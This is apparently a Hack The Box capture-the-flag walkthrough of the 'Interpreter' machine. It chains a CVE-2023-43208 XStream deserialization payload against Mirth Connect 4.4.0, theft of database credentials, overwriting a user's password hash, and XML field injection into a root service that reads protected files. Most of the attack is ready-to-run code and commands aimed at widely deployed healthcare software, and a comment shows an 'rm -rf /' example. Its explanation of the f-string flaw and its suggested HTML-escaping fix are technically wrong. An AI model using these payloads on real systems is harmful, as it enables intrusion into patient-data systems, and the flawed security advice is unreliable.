# INTERPRETER HTB - Simple Walkthrough for Beginners

## What is Mirth Connect?

**Mirth Connect** is a software that helps hospitals and clinics share patient data. Think of it like a postal service for medical information:

- **Hospitals/clinics** send patient data in a special format called **HL7** (it's like a standardized envelope with patient info)
- **Mirth Connect** reads this data and transforms it into different formats (like XML)
- It then **forwards the data** to other systems that need it

Example HL7 message:
```
MSH|^~\&|HOSPITAL|LAB|SYSTEM|RECEIVER|20250101120000||ADT^A01|||2.5
PID|1||PATIENTID^^^HOSPITAL||LASTNAME^FIRSTNAME||19900101|M
```

Mirth Connect makes this readable and forwards it to other applications.

---

## The Machine: INTERPRETER

This machine has:
- **Port 443**: Mirth Connect web interface (version 4.4.0)
- **Port 6661**: HL7 data listener (MLLP protocol)
- **Port 54321**: A hidden Python service (secret!)

The security flaw: **Mirth Connect 4.4.0 has a bug** that lets attackers execute commands before even logging in.

---

## Step-by-Step Exploitation

### STEP 1: Find the Bug (Reconnaissance)

```bash
# Check what's running
nmap -sV 10.129.1.43

# Find Mirth Connect version
curl -k https://10.129.1.43/api/server/version
# Answer: 4.4.0
```

### STEP 2: Exploit the Bug (Get Command Execution)

Mirth Connect 4.4.0 has a vulnerability called **CVE-2023-43208**. 

**What's the bug?**
- Mirth accepts XML data at `https://10.129.1.43/api/users`
- It processes this XML using a Java library called XStream
- XStream has a known gadget chain that lets us run Java code

**What does that mean?**
Think of it like sending Mirth a special XML package that says: "Hey, when you open this XML, please run this command for me."

**How to exploit it:**

```bash
# Step 1: Prepare the malicious XML
# (This XML tells Java to run the command `id`)
cat > payload.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" ?>
<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.Runtime</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getMethod</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.String</java-class>
                            <java-class>[Ljava.lang.Class;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <string>getRuntime</string>
                            <java-class-array/>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>invoke</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.Object</java-class>
                            <java-class>[Ljava.lang.Object;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <null/>
                            <object-array/>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>exec</iMethodName>
                        <iParamTypes>
                            <java-class>java.lang.String</java-class>
                        </iParamTypes>
                        <iArgs>
                            <string>id</string>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes>
                <string>compareTo</string>
            </eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>
EOF

# Step 2: Send the malicious XML to the vulnerable endpoint
curl -sk -X POST "https://10.129.1.43/api/users" \
  -H "Content-Type: application/xml" \
  -H "X-Requested-With: OpenAPI" \
  -d @payload.xml

# Result: The server executes the `id` command!
# We're now running commands as the "mirth" user
```

**Simple explanation:**
- We sent a specially crafted XML package
- Java unpacked it and found instructions to run code
- Boom! We can run any command we want

### STEP 3: Find Database Credentials

Now that we can run commands, we look around:

```bash
# Read the Mirth configuration file
cat /proc/$(pgrep -f mirth)/cwd/conf/mirth.properties | grep password

# Found: database.password = MirthPass123!
# Database user: mirthdb
# Database name: mc_bdd_prod
```

### STEP 4: Access the Database

Mirth stores user data in MariaDB:

```bash
# Connect to database
mysql -u mirthdb -pMirthPass123! -h 127.0.0.1 mc_bdd_prod

# List users
SELECT ID, USERNAME FROM PERSON;
# Output: ID=2, USERNAME=sedric

# Check sedric's password (it's hashed, not encrypted)
SELECT PASSWORD FROM PERSON_PASSWORD WHERE PERSON_ID=2;
# Output: u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

### STEP 5: Create a New Password for sedric

The password is stored using **PBKDF2** (a secure hashing algorithm). Here's the trick:

```bash
# Instead of cracking the password, we just create a NEW password hash!
python3 << 'PYTHON'
import hashlib
import base64

# New password: "password123"
password = "password123"
salt = bytes.fromhex("4142434445464748")  # 8 bytes salt

# PBKDF2 with 600,000 iterations (that's what Mirth 4.4.0 uses)
dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000, dklen=32)

# Format: salt + hash, then base64 encode
hash_bytes = salt + dk
hash_b64 = base64.b64encode(hash_bytes).decode()

print(f"New hash: {hash_b64}")
PYTHON

# Copy the hash output and update the database
mysql -u mirthdb -pMirthPass123! mc_bdd_prod << 'SQL'
UPDATE PERSON_PASSWORD 
SET PASSWORD='QUJDREVGR0gYwkIqQe5LB2KBXrhLUQJ4TlMjcmrpUp4phuKwT9ihlg==' 
WHERE PERSON_ID=2;
SQL

# Now sedric's password is "password123"!
```

**Why this works:**
- Mirth stores password hashes, not passwords
- We can calculate the hash of our OWN password
- We replace sedric's hash with our calculated hash
- Now we know the password ("password123") AND have the hash

### STEP 6: Login as sedric

Now we can authenticate to Mirth's API:

```bash
# Login to Mirth API as sedric
curl -sk -u "sedric:password123" -H "X-Requested-With: OpenCode" \
  https://10.129.1.43/api/users/current

# Success! We get XML response with sedric's user info
```

### STEP 7: Discover the Hidden Service

As sedric, we explore Mirth's channels:

```bash
# Get the channel configuration
curl -sk -u "sedric:password123" \
  https://10.129.1.43/api/channels/24c915f9-d3e3-462a-a126-3511d3f3cd0a

# This tells us:
# - Channel receives HL7 data on port 6661
# - It converts to XML
# - It sends to: http://127.0.0.1:54321/addPatient
# This is a hidden service! Running as ROOT!
```

### STEP 8: Exploit the Hidden Service

We discover **notif.py** is running on port 54321 (as root!). Let's test it:

```bash
# Send a normal XML packet
curl -X POST "http://127.0.0.1:54321/addPatient" \
  -H "Content-Type: text/xml" \
  -d '<patient>
    <timestamp>20250101120000</timestamp>
    <sender_app>TEST</sender_app>
    <id>123</id>
    <firstname>John</firstname>
    <lastname>Doe</lastname>
    <birth_date>01/01/1990</birth_date>
    <gender>M</gender>
</patient>'

# Response: "Patient John Doe (M), 36 years old, received from TEST at 20250101120000"
```

### STEP 9: Find the Vulnerability in notif.py

Here's the problem with notif.py:

```python
# Simplified pseudocode of notif.py:
firstname = request.xml['firstname']  # Gets value from XML
lastname = request.xml['lastname']

# The bug: uses f-strings with user input!
response = f"Patient {firstname} {lastname} ({gender})..."
```

**The vulnerability:**
If we put `{python_code}` in the firstname field, Python will **evaluate it**!

```bash
# Test: send {empty}
curl -X POST "http://127.0.0.1:54321/addPatient" \
  -H "Content-Type: text/xml" \
  -d '<patient>
    <timestamp>20250101120000</timestamp>
    <sender_app>TEST</sender_app>
    <id>123</id>
    <firstname>{}</firstname>
    <lastname>Doe</lastname>
    <birth_date>01/01/1990</birth_date>
    <gender>M</gender>
</patient>'

# Response: [EVAL_ERROR] f-string: empty expression not allowed
# Proof of concept! The {} is being evaluated!
```

### STEP 10: Read the Flags!

Now exploit it to read protected files:

```bash
# Read user.txt (running as root!)
curl -X POST "http://127.0.0.1:54321/addPatient" \
  -H "Content-Type: text/xml" \
  -d '<patient>
    <timestamp>20250101120000</timestamp>
    <sender_app>TEST</sender_app>
    <id>123</id>
    <firstname>{open("/home/sedric/user.txt").read()}</firstname>
    <lastname>Doe</lastname>
    <birth_date>01/01/1990</birth_date>
    <gender>M</gender>
</patient>'

# Response includes the flag!
# "Patient 3f21ca6e658708c931336bd4e3afc402 Doe (M)..."

# Read root.txt
curl -X POST "http://127.0.0.1:54321/addPatient" \
  -H "Content-Type: text/xml" \
  -d '<patient>
    <timestamp>20250101120000</timestamp>
    <sender_app>TEST</sender_app>
    <id>123</id>
    <firstname>{open("/root/root.txt").read()}</firstname>
    <lastname>Doe</lastname>
    <birth_date>01/01/1990</birth_date>
    <gender>M</gender>
</patient>'

# "Patient 92a459b1e230f362acf4268116917dec Doe (M)..."
```

---

## Summary of the Attack

| Step | Action | Result |
|------|--------|--------|
| 1 | Find Mirth Connect 4.4.0 | Vulnerable to XStream RCE |
| 2 | Send malicious XML | Execute commands as `mirth` user |
| 3 | Read database config | Get DB credentials |
| 4 | Access MySQL database | Read sedric's password hash |
| 5 | Generate new hash | Change sedric's password to "password123" |
| 6 | Login as sedric | Access Mirth API |
| 7 | Discover notif.py | Find hidden root service |
| 8 | Test f-string eval | Confirm vulnerability in notif.py |
| 9 | Exploit f-string | Execute Python code as root |
| 10 | Read flags | **3f21ca6e658708c931336bd4e3afc402** (user) & **92a459b1e230f362acf4268116917dec** (root) |

---

## Key Learnings

### 1. Never Trust User Input in f-Strings
```python
# DANGEROUS:
user_name = request.form['name']  # Could be: {os.system('rm -rf /')}
message = f"Hello {user_name}"     # BOOM! Code execution!

# SAFE:
message = f"Hello {escape_html(user_name)}"  # Escape dangerous characters
```

### 2. Database Access is Critical
If you can access the database, you can:
- Change passwords directly
- Read sensitive data
- Modify application logic

### 3. Defense in Depth
- Even if Mirth is compromised, the hidden service should NOT run as root
- Or it should validate input more carefully
- Or use sandboxing

### 4. Hidden Services Are Still a Risk
Just because it's on localhost (127.0.0.1) doesn't mean it's safe. If you can run code on the machine, you can access it!

---

## Real-World Application

This shows why healthcare systems need strong security:
- Patient data is sensitive
- Mirth Connect is widely used in hospitals
- A single bug can expose thousands of patient records

That's why cybersecurity in healthcare is so important!
